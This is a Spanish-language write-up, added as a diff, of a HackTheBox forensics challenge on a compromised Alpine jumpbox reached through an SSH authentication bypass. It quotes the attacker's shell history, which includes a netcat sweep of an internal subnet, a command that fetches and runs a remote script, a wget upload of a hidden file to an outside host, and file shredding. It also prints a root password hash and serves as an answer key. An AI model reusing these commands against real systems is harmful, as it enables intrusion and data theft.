@@ -1,0 +1,200 @@
+---
+type: writeup
+title: SSHole
+description: Se detectó tráfico sospechoso desde un servidor intermedio mal configurado hacia un dominio sospechoso. Se le han proporcionado pruebas extraídas del servidor intermedio. Determine cómo los atacantes obtuvieron acceso al servidor y qué actividades realizaron posteriormente.
+lang: es
+draft: false
+featured: true
+image: ../../../../images/writeups/hackthebox/sherlocks/sshole/sshole.png
+platform: hackthebox
+url: https://app.hackthebox.com/sherlocks/SSHole
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## Task 1
+
+<Callout type="question" title="Task 1">
+  What Linux distribution name and version was the targeted server running?
+</Callout>
+
+Para saber el nombre y versión de la distribución de Linux leemos el archivo `SSHole/etc/os-release`
+
+```bash
+cat etc/os-release
+```
+
+```plaintext
+NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.24.3
+PRETTY_NAME="Alpine Linux v3.24"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
+```
+
+<Callout type="success" title="Linux distribution name and version">
+  Alpine Linux 3.24.3
+</Callout>
+
+## Task 2
+
+<Callout type="question" title="Task 2">
+  What is the CVE ID of the vulnerability abused by the attacker to gain access?
+</Callout>
+
+Hacemos una búsqueda en Google de vulnerabilidades en la versión de la distribución de Linux más la pista en el nombre del sherlock `sshole` ya que según yo no hay otras pistas ni información que hasta el momento ayuden a dar con el CVE.
+
+Para verificar la vulnerabilidad, abrimos el archivo `SSHole/etc/shadow` para ver si se cumple la condición que debe existir por lo menos una cuenta para iniciar sesión por SSH cuyo campo de contraseña sea exactamente `*`.
+
+```bash
+cat etc/shadow
+```
+
+```plaintext
+root:$6$f4XOlG/We5wpezjh$Bep5mZyr76NljQ2vWEEw6sanaOal4KEZb9skOuUtAvp5DG8y0QgVnuGEWo4blYqP.XvnwYIm.8.pIX7C6ljiR1:20763:0:::::
+bin:!::0:::::
+daemon:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+games:!::0:::::
+ntp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+klogd:!:20763:0:99999:7:::
+adminsvc:*:20763:0:99999:7:::
+```
+
+El usuario `adminsvc` cumple con esa condición. También analizamos los logs de SSH.
+
+```bash
+grep adminsvc --color=auto var/log/messages
+```
+
+```plaintext
+Nov  6 11:27:05 dev-jumpbox auth.info sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
+Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
+Nov  6 12:20:02 dev-jumpbox auth.info sshd-session[4854]: Disconnected from user adminsvc 192.168.72.1 port 61351
+```
+
+Vemos que hubo intentos de iniciar sesión con la cuenta del usuario que cumple la condición de la vulnerabilidad.
+
+<Callout type="success" title="CVE ID">
+  CVE-2026-123158
+</Callout>
+
+## Task 3
+
+<Callout type="question" title="Task 3">
+  When did the attacker exploit the vulnerability?
+</Callout>
+
+En los logs de SSH es la fecha en la que se acepta la contraseña.
+
+```bash
+grep adminsvc --color=auto var/log/messages
+```
+
+```plaintext
+<SNIP>
+Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
+<SNIP>
+```
+
+<Callout type="success" title="Date & Time">
+  2026-11-06 11:27:08
+</Callout>
+
+## Task 4
+
+<Callout type="question" title="Task 4">
+  Which user account was abused by the attacker?
+</Callout>
+
+La cuenta es la relacionada al inicio de sesión por SSH.
+
+<Callout type="success" title="User account abused">
+  adminsvc
+</Callout>
+
+## Task 5
+
+<Callout type="question" title="Task 5">
+  What string value causes the authentication bypass?
+</Callout>
+
+Como lo indica el investigador en su artículo de divulgación de la vulnerabilidad [https://ethiack.com/info-hub/research/sshole-cve-2026-123158](https://ethiack.com/info-hub/research/sshole-cve-2026-123158) el asterisco es ese valor y que en el archivo `SSHole/etc/shadow` podemos verificar.
+
+```bash
+grep adminsvc etc/shadow
+```
+
+```plaintext
+adminsvc:*:20763:0:99999:7:::
+```
+
+<Callout type="success" title="String value">
+  *
+</Callout>
+
+## Task 6
+
+<Callout type="question" title="Task 6">
+  What command did the attacker use to scan the network reachable via the
+  jumpbox, allowing them to target internal developer systems?
+</Callout>
+
+Buscamos en los logs de comandos ejecutados `SSHole/home/adminsvc/.ash_history`.
+
+```bash
+cat home/adminsvc/.ash_history
+```
+
+```plaintext
+ls -la
+for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
+<SNIP>
+```
+
+<Callout type="success" title="Command">
+    `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`
+</Callout>
+
+## Task 7
+
+<Callout type="question" title="Task 7">
+  What was the exfiltration URI where the attacker exfiltrated a sensitive file?
+</Callout>
+
+De acuerdo a los logs de comandos ejecutados por el atacante encontramos que realizó una request por POST enviando el archivo oculto `/tmp/.devenv` a la URI indicada.
+
+```bash
+cat home/adminsvc/.ash_history
+```
+
+```plaintext
+ls -la
+for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
+vi scanreport.txt
+cat scanreport.txt
+bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
+ls -la /tmp
+ls -l /tmp/.devenv
+wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
+shred -u /tmp/.devenv
+exit
+```
+
+<Callout type="success" title="URI">
+  https://devv.coding.eu/process
+</Callout>
